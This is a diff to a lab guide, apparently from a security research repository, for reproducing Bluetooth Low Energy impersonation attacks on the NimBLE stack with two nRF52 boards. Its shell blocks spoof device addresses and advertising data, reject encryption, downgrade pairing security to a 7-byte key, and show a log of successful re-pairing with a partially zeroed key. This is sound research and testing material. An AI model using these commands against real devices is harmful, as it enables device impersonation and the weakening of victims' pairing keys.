@@ -52,7 +52,7 @@ Test the impersonation attacks on the NimBLE stack using only two nRF52 boards. 
 
 ### Initial Setup
 
-Configure and pair the two boards interacting with the via the shell. On the Peripheral run:
+Configure and pair the two boards interacting with them via the shell and using these exact commands. On the Peripheral run:
 ```sh
 spoof-address addr=F8:4C:6D:E9:7A:B1 addr_type=random
 spoof-adv-data name="MyMouse" appearance=962
@@ -85,7 +85,7 @@ blerp-reject-enc val=1
 # Begin malicious advertising
 advertise own_addr_type=random
 ```
-On the Central device run the `connect` command again. The logs should show a connection with a partially zeroed-out Long Term Key (LTK) and status=0, indicating successful re-pairing.
+On the Central device run the `connect` command again (with the same parameters). The logs should show a connection with a partially zeroed-out Long Term Key (LTK) and status=0, indicating successful re-pairing.
 ```sh
 LTK: 00000000000000000094d39485d06811
 pairing complete; status=0
@@ -101,8 +101,7 @@ If proceeding immediately after the Peripheral Impersonation attack, you must re
 spoof-address addr=00:1A:79:FF:EE:DD addr_type=public
 
 # Downgrade Security Parameters
-spoof-authreq mitm=1 bond=1 sc=1
-security-set-data mitm=0 sc=0 keysize=7 blerp-reject-enc val=1
+security-set-data mitm=0 sc=0 keysize=7
 ```
 Connect the attacker board to the victim Peripheral.
 ```sh
